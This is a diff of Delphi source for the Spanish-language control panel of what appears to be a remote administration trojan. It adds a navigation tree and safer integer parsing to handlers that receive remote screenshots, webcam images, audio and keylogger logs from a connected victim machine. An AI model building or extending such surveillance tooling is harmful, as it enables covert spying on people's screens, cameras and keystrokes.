@@ -20,9 +20,7 @@ uses
   ExtCtrls,
   StdCtrls,
   Buttons,
-  {ScktComp,}
   Jpeg,
-  Spin,
   IdTCPServer,
   ActiveX,
   gnugettext,
@@ -220,7 +218,6 @@ type
     TrackBarCalidad: TTrackBar;
     BtnCapturarScreen: TSpeedButton;
     CheckBoxAutoCapturaScreen: TCheckBox;
-    SpinCaptureScreen: TSpinEdit;
     btnGuardarImagen: TSpeedButton;
     BtnVerGrandeCap: TSpeedButton;
     LabelPosicionCompresJpg: TLabel;
@@ -232,7 +229,6 @@ type
     ComboBoxWebcam: TComboBox;
     LabelCalidadWebcam: TLabel;
     CheckBoxAutoCamCapture: TCheckBox;
-    SpinCam: TSpinEdit;
     BtnCapturarWebcam: TSpeedButton;
     TrackBarCalidadWebcam: TTrackBar;
     BtnGuardarWebcam: TSpeedButton;
@@ -253,7 +249,6 @@ type
     SplitterAudio: TSplitter;
     ListViewAudio: TListView;
     LabelTamanioAudio: TLabel;
-    SpinEditAudio: TSpinEdit;
     Label2: TLabel;
     SpeedButtonCapAudio: TSpeedButton;
     CheckBoxCapturarAudioAutomaticamente: TCheckBox;
@@ -292,6 +287,12 @@ type
     ListViewArchivos: TListView;
     SplitterArchivos: TSplitter;
     TreeViewArchivos: TTreeView;
+    SpinCam: TEdit;
+    SpinCaptureScreen: TEdit;
+    Spineditaudio: TEdit;
+    LabelSegundos: TLabel;
+    TreeViewSecciones: TTreeView;
+    Splitter: TSplitter;
     procedure FormCreate(Sender: TObject);
     procedure BtnRefrescarProcesosClick(Sender: TObject);
     procedure BtnRefrescarVentanasClick(Sender: TObject);
@@ -477,6 +478,7 @@ type
     procedure ListViewArchivosKeyPress(Sender: TObject; var Key: Char);
     procedure N13Click(Sender: TObject);
     procedure TreeViewArchivosClick(Sender: TObject);
+    procedure TreeViewSeccionesClick(Sender: TObject);
 
   private //Funciones y variables privadas que solo podemos usar en este Form
     FormVisorDeMiniaturas: TObject;
@@ -687,11 +689,17 @@ begin
 end;
 
 procedure TFormControl.FormCreate(Sender: TObject);
+var
+  i, j : integer;
+  Nodo, Nodo2: TTreeNode;
 begin
+
   UseLanguage(Formmain.idioma);
   PrimeraVezQueMeMuestro := True;
   TranslateComponent(Self);
   SetLength(MSGPosibles, 60);
+
+  {Mensajes recibidos por el servidor en forma MSG|ID}
   MSGPosibles[0] := _('Desinstalando servidor...');
   MSGPosibles[1] := _('Hubo un problema al intentar auto-ejecutarse); la actualización se completara en el siguiente reinicio');
   MSGPosibles[2] := _('Proceso matado con PID ');
@@ -776,6 +784,54 @@ begin
   PageControlArchivos.ActivePage := TabSheetVerArchivos;
   PageControlManagers.ActivePage := TabProcesos;
   PageControlVigilancia.ActivePage := TabScreencap;
+
+  {Rellenamos el treeview}
+  for i := 0 to PageControl.PageCount-1 do
+  begin
+    Nodo := TreeViewSecciones.Items.Add(nil, PageControl.Pages[i].Caption);
+    Nodo.ImageIndex := PageControl.Pages[i].ImageIndex;
+    Nodo.SelectedIndex := Nodo.ImageIndex;
+      if (i = 0) then {Información}
+      begin
+        for j := 0 to PageControlInformacion.PageCount-1 do
+        begin
+          Nodo2 := TreeViewSecciones.Items.AddChild(Nodo, PageControlInformacion.Pages[j].Caption);
+          Nodo2.ImageIndex := PageControlInformacion.Pages[j].ImageIndex;
+          Nodo2.SelectedIndex := Nodo2.ImageIndex;
+        end;
+      end
+      else if (i = 1 ) then
+      begin
+        for j := 0 to PageControlArchivos.PageCount-1 do
+        begin
+          Nodo2 := TreeViewSecciones.Items.AddChild(Nodo, PageControlArchivos.Pages[j].Caption);
+          Nodo2.ImageIndex := PageControlArchivos.Pages[j].ImageIndex;
+          Nodo2.SelectedIndex := Nodo2.ImageIndex;
+        end;
+      end
+      else if (i = 2) then
+      begin
+        for j := 0 to PageControlManagers.PageCount-1 do
+        begin
+          Nodo2 := TreeViewSecciones.Items.AddChild(Nodo, PageControlManagers.Pages[j].Caption);
+          Nodo2.ImageIndex := PageControlManagers.Pages[j].ImageIndex;
+          Nodo2.SelectedIndex := Nodo2.ImageIndex;
+        end;
+      end
+      else if (i = 3) then
+      begin
+        for j := 0 to PageControlVigilancia.PageCount-1 do
+        begin
+          Nodo2 := TreeViewSecciones.Items.AddChild(Nodo, PageControlVigilancia.Pages[j].Caption);
+          Nodo2.ImageIndex := PageControlVigilancia.Pages[j].ImageIndex;
+          Nodo2.SelectedIndex := Nodo2.ImageIndex;
+        end;
+      end;
+      Nodo.Expanded := true; {Lo expandimos para su correcta visualización}
+       Nodo := TreeViewSecciones.Items.Add(nil, '');{Espacio vacio}
+       Nodo.ImageIndex := -1;
+       Nodo.SelectedIndex := -1;
+  end;
 end;
 
 procedure TFormControl.Cargariconos();
@@ -2428,15 +2484,15 @@ procedure TFormControl.Eliminar1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
     begin
-      if PopupRegistro.PopupComponent.ClassType = TListView then
+      if (PopupRegistro.PopupComponent.ClassType = TListView) and (ListViewRegistro.Selected <> nil) then
         begin
           if MessageDlg(_('¿Está seguro de que quiere borrar el valor ') +
             ListViewRegistro.Selected.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
             ConnectionWriteLn(Servidor, 'BORRARREGISTRO|' + EditPathRegistro.Text +
               ListViewRegistro.Selected.Caption);
         end
-      else if MessageDlg(_('¿Está seguro de que quiere borrar la clave ') +
-        TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
+      else if (TreeviewRegedit.Selected <> nil) and (MessageDlg(_('¿Está seguro de que quiere borrar la clave ') +
+        TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo) then
         ConnectionWriteLn(Servidor, 'BORRARREGISTRO|' + EditPathRegistro.Text);
     end
   else
@@ -2562,6 +2618,7 @@ begin
   if not BtnCapturarScreen.Enabled then Exit;
   if not Servidor.Connection.Connected then
     begin
+      CheckBoxAutoCapturaScreen.Checked := false;
       MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
       Exit;
     end;
@@ -2569,10 +2626,16 @@ begin
   BtnCapturarScreen.Enabled := False;
   if TimerCaptureScreen.Enabled then
     TimerCaptureScreen.Enabled := not TimerCaptureScreen.Enabled; //Desactivamos el timer, será activado cuando recibamos la captura
+  
   if FormVisorCaptura = nil then
     ConnectionWriteLn(Servidor, 'CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr(imgCaptura.Height) + '|')
   else
-    ConnectionWriteLn(Servidor, 'CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr((FormVisorCaptura as TScreenMax).imgcaptura.Height) + '|');
+  begin
+  if (FormVisorCaptura as TScreenMax).Visible then
+    ConnectionWriteLn(Servidor, 'CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr((FormVisorCaptura as TScreenMax).imgcaptura.Height) + '|')
+  else
+    ConnectionWriteLn(Servidor, 'CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr(imgCaptura.Height) + '|')
+  end;
 end;
 
 procedure TFormControl.Enviarteclas1Click(Sender: TObject);
@@ -2824,14 +2887,18 @@ var
   p: Pointer;
   Bufferr: array[0..4095 {4kb}] of Byte;
 begin
-  Buffer := Trim(ConnectionReadLn(Athread, #10#15#80#66#77#1#72#87));
-
+  try
+  Buffer := ConnectionReadLn(Athread, #10#15#80#66#77#1#72#87);
+  except
+    Athread.Connection.Disconnect;
+    Exit;
+  end;
   if Copy(PChar(Buffer), 1, 7) = 'GETFILE' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
       FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt64(Buffer);
+      Size := StrToInt64Def(Buffer, 0);
       CrearDirectoriosUsuario();
       Descarga := TDescargaHandler.Create(Athread, FilePath, Size,
         DirDescargas + ExtractFileName(FilePath), ListViewDescargas, True);
@@ -2843,7 +2910,7 @@ begin
       Delete(Buffer, 1, Pos('|', Buffer));
       FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt64(Buffer);
+      Size := StrToInt64def(Buffer, 0);
       for i := 0 to ListViewDescargas.Items.Count - 1 do
         begin
           Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
@@ -2882,12 +2949,12 @@ begin
       Delete(Buffer, 1, Pos('|', Buffer));
       //La anchura y altura de su pantalla
       FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
-      AnchuraPantalla := StrToInt(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
+      AnchuraPantalla := StrToIntdef(Copy(FilePath, 1, Pos('¬', FilePath) - 1), 100);
       Delete(FilePath, 1, Pos('¬', FilePath));
-      AlturaPantalla := StrToInt(FilePath);
+      AlturaPantalla := StrToIntdef(FilePath, 0);
       Delete(Buffer, 1, Pos('|', Buffer));
       //0=CapScreen
-      CapSize[0] := StrToInt(Trim(Buffer)); //El tamaño de la captura
+      CapSize[0] := StrToIntdef(Buffer,0 ); //El tamaño de la captura
       MSC[0] := TMemoryStream.Create;
       MSC[0].Position := 0;
       ProgressBarScreen.Position := 0; //Ponemos a 0 la barra de progreso
@@ -2897,7 +2964,7 @@ begin
     begin
       //Estamos recibiendo un fragmento de la captura
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Size := StrToIntdef(Copy(Buffer, 1, Pos('|', Buffer) - 1),0 ); //Tamaño del chunk!
       Delete(Buffer, 1, Pos('|', Buffer));
       Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
       //0=CapScreen
@@ -2922,6 +2989,11 @@ begin
             end
           else
             begin
+              if (FormMain.ListViewConexiones.Selected = MyItem) and (FormMain.SpeedButtonAvisarActividad.Left > JPG.Width) then
+              begin
+                (FormMain.ImageDesktop).Width := JPG.Width; //Establecemos ancho
+                (FormMain.ImageDesktop).Picture.Assign(JPG);
+              end;
               imgCaptura.Width := JPG.Width; //Establecemos ancho
               imgCaptura.Height := JPG.Height; //Establecemos alto
               imgcaptura.Picture.Assign(JPG);
@@ -2948,7 +3020,7 @@ begin
       //memory stream y el tamaño del buffer que tenemos que recibir
       Delete(Buffer, 1, Pos('|', Buffer));
       //1=CapWebcam
-      CapSize[1] := StrToInt(Trim(Buffer)); //El tamaño de la captura
+      CapSize[1] := StrToIntdef(Buffer, 0); //El tamaño de la captura
       MSC[1] := TMemoryStream.Create;
       MSC[1].Position := 0;
       ProgressBarWebCam.Position := 0; //Ponemos a 0 la barra de progreso
@@ -2957,7 +3029,7 @@ begin
     begin
       //Estamos recibiendo un fragmento de la captura
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Size := StrToIntdef(Copy(Buffer, 1, Pos('|', Buffer) - 1), 0); //Tamaño del chunk!
       Delete(Buffer, 1, Pos('|', Buffer));
       Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
       //1=CapWebcam
@@ -2990,7 +3062,7 @@ begin
   else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILSTART' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
-      CapSize[2] := StrToInt(Trim(Buffer)); //Tamaño del Thumbnail
+      CapSize[2] := StrToIntdef(Buffer, 0); //Tamaño del Thumbnail
 
       (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := 0;
       MSC[2] := TMemoryStream.Create;
@@ -3006,7 +3078,7 @@ begin
   else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILCHUNK' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Size := StrToIntdef(Copy(Buffer, 1, Pos('|', Buffer) - 1), 0); //Tamaño del chunk!
       Delete(Buffer, 1, Pos('|', Buffer));
 
       Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
@@ -3030,7 +3102,7 @@ begin
   else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGSTART' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
-      CapSize[4] := StrToInt64(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del Log
+      CapSize[4] := StrToInt64def(Copy(Buffer, 1, Pos('|', Buffer) - 1),0 ); //Tamaño del Log
       ProgressBarKeylogger.Position := 0;
       MSC[4] := TMemoryStream.Create;
       MSC[4].Position := 0;
@@ -3038,7 +3110,7 @@ begin
   else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGCHUNK' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Size := StrToIntdef(Copy(Buffer, 1, Pos('|', Buffer) - 1), 0); //Tamaño del chunk!
       Delete(Buffer, 1, Pos('|', Buffer));
 
       Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
@@ -3068,7 +3140,7 @@ begin
   else if Copy(PChar(Buffer), 1, 10) = 'AUDIOSTART' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
-      CapSize[3] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del Log
+      CapSize[3] := StrToIntdef(Copy(Buffer, 1, Pos('|', Buffer) - 1),0 ); //Tamaño del Log
       ProgressBarAudio.Position := 0;
       MSC[3] := TMemoryStream.Create;
       MSC[3].Position := 0;
@@ -3077,7 +3149,7 @@ begin
   else if Copy(PChar(Buffer), 1, 10) = 'AUDIOCHUNK' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Size := StrToIntdef(Copy(Buffer, 1, Pos('|', Buffer) - 1), 0); //Tamaño del chunk!
       Delete(Buffer, 1, Pos('|', Buffer));
 
       Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
@@ -3092,7 +3164,7 @@ begin
             begin
               item := listviewAudio.Items.Add();
               NumeroAudio := NumeroAudio + 1;
-              item.Caption := IntToStr(NumeroAudio);
+              item.Caption := IntToStr(NumeroAudio );
               item.subitems.Add(IntToStr(MSC[3].Size));
               {hz canal bits}
               TmpStr := UltimoFormato;
@@ -3101,7 +3173,7 @@ begin
               TempStr2 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //Canal
               Delete(TmpStr, 1, Pos('-', TmpStr));
               TempStr3 := TmpStr; //Bits
-              item.subitems.Add(IntToStr(StrToInt(tempstr1) * StrToInt(Tempstr2) * StrToInt(Tempstr3) div 8));
+              item.subitems.Add(IntToStr(StrToIntdef(tempstr1,0) * StrToIntdef(Tempstr2,0) * StrToIntdef(Tempstr3,0) div 8));
               item.subitems.Add(FormatDateTime('hh:mm:ss', now));
 
               Item.Subitems.Add(UltimoFormato);
@@ -3111,7 +3183,7 @@ begin
               MSC[3].Position := 0;
               setlength(buffer, MSC[3].Size);
               MSC[3].read(buffer[1], MSC[3].Size);
-              InitWavFile(MS2, StrToInt(TempStr2), StrToInt(TempStr1), StrToInt(TempStr3), buffer);
+              InitWavFile(MS2, StrToIntdef(TempStr2,0), StrToIntdef(TempStr1,0), StrToIntdef(TempStr3,0), buffer);
               setlength(buffer, ms2.Size);
               ms2.read(buffer[1], ms2.Size);
 
@@ -3561,12 +3633,12 @@ begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         begin
           FilePath := EditPathArchivos.Text + mslistviewitem.Caption;
-          Size := StrToInt(mslistviewitem.SubItems.Strings[4]);
+          Size := StrToIntdef(mslistviewitem.SubItems.Strings[4],0);
         end
       else
         begin
           FilePath := mslistviewitem.subitems[0];
-          Size := StrToInt(mslistviewitem.SubItems.Strings[5]);
+          Size := StrToIntdef(mslistviewitem.SubItems.Strings[5],0);
         end;
       Descarga := TDescargaHandler.Create(nil, FilePath, Size,
         DirDescargas + ExtractFileName(FilePath), ListViewDescargas, True);
@@ -3720,11 +3792,11 @@ end;
 procedure TFormControl.SpinCaptureScreenChange(Sender: TObject);
 begin
   try
-    if SpinCaptureScreen.Value < 0 then
-      SpinCaptureScreen.Value := 0;
-    if SpinCaptureScreen.Value > 30 then
-      SpinCaptureScreen.Value := 30;
-    TimerCaptureScreen.Interval := SpinCaptureScreen.Value * 1000 + {250} 50;
+    if strtointdef(SpinCaptureScreen.text, 2) < 0 then
+      SpinCaptureScreen.text := '0';
+    if strtointdef(SpinCaptureScreen.text, 2) > 30 then
+      SpinCaptureScreen.text := '30';
+    TimerCaptureScreen.Interval := strtointdef(SpinCaptureScreen.text, 2) * 1000 + {250} 50;
   except
   end;
 end;
@@ -3737,7 +3809,7 @@ begin
       BtnCapturarScreen.Click; //Hacemos la primera captura
     end;
 
-  TimerCaptureScreen.Interval := SpinCaptureScreen.Value * 1000 + {250} 50;
+  TimerCaptureScreen.Interval := strtointdef(SpinCaptureScreen.text, 2) * 1000 + {250} 50;
   TimerCaptureScreen.Enabled := CheckBoxAutoCapturaScreen.Checked;
   TabScreenCap.Highlighted := TimerCaptureScreen.Enabled; //Para no olvidarnos que lo tenemos activo
 end;
@@ -3783,11 +3855,11 @@ end;
 procedure TFormControl.SpinCamChange(Sender: TObject);
 begin
   try
-    if SpinCam.Value < 0 then
-      SpinCam.Value := 0;
-    if SpinCam.Value > 30 then
-      SpinCam.Value := 30;
-    TimerCamCapture.Interval := SpinCam.Value * 1000 + {250} 50;
+    if strtointdef(SpinCam.text,2) < 0 then
+      SpinCam.text := '0';
+    if strtointdef(SpinCam.text,2) > 30 then
+      SpinCam.text := '30';
+    TimerCamCapture.Interval := strtointdef(SpinCam.text,2) * 1000 + {250} 50;
   except
   end;
 end;
@@ -3800,7 +3872,7 @@ begin
       BtnCapturarWebcam.Click; //Hacemos la primera captura
     end;
 
-  TimerCamCapture.Interval := SpinCam.Value * 1000 + {250} 50;
+  TimerCamCapture.Interval := strtointdef(SpinCam.text,2) * 1000 + {250} 50;
   TimerCamCapture.Enabled := CheckBoxAutoCamCapture.Checked;
   TabWebcam.Highlighted := TimerCamCapture.Enabled; //Para no olvidarnos que lo tenemos activo
 end;
@@ -4467,7 +4539,7 @@ end;
 
 procedure TFormControl.TabSheetVerArchivosShow(Sender: TObject);
 begin
-  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) and (TreeViewArchivos.Items.Count = 0) then
     BtnVerunidades.Click;
 end;
 
@@ -5081,8 +5153,11 @@ begin
       PrimeraVezQueMeMuestro := False;
       NumCachedNodes := 0;
     end;
-  SplitterArchivos.Visible := FormOpciones.CheckBoxIncluirTreeView.Checked;
+  self.ShowHint := FormOpciones.CheckBoxAyuda2.Checked;
   TreeViewArchivos.Visible := FormOpciones.CheckBoxIncluirTreeView.Checked;
+  SplitterArchivos.Visible := TreeViewArchivos.Visible;
+  TreeViewSecciones.Visible := FormOpciones.CheckBoxTreeViewCC.Checked;
+  Splitter.Visible := TreeViewSecciones.Visible;
 end;
 
 procedure TFormControl.BtnRefrescarPuertosClick(Sender: TObject);
@@ -5313,6 +5388,49 @@ begin
 end;
 
 
+
+procedure TFormControl.TreeViewSeccionesClick(Sender: TObject);
+var
+  i, j: integer;
+  text : string;
+begin
+  if (TreeViewSecciones.Selected <> nil) then
+  begin
+  text := TreeViewSecciones.Selected.text;
+  for i := 0 to PageControl.PageCount-1 do
+    if PageControl.Pages[i].Caption = text then
+      PageControl.ActivePageIndex := i;
+
+  for j := 0 to PageControlInformacion.PageCount-1 do
+    if PageControlInformacion.Pages[j].Caption = text then
+    begin
+      PageControlInformacion.ActivePageIndex := j;
+      PageControl.ActivePageIndex := 0;
+    end;
+
+  for j := 0 to PageControlArchivos.PageCount-1 do
+    if PageControlArchivos.Pages[j].Caption = text then
+    begin
+      PageControlArchivos.ActivePageIndex := j;
+      PageControl.ActivePageIndex := 1;
+    end;
+
+  for j := 0 to PageControlManagers.PageCount-1 do
+    if PageControlManagers.Pages[j].Caption = text then
+    begin
+      PageControlManagers.ActivePageIndex := j;
+      PageControl.ActivePageIndex := 2;
+    end;
+
+  for j := 0 to PageControlVigilancia.PageCount-1 do
+    if PageControlVigilancia.Pages[j].Caption = text then
+    begin
+      PageControlVigilancia.ActivePageIndex := j;
+      PageControl.ActivePageIndex := 3;
+    end;
+
+  end;
+end;
 
 end. //Fin del proyecto
 
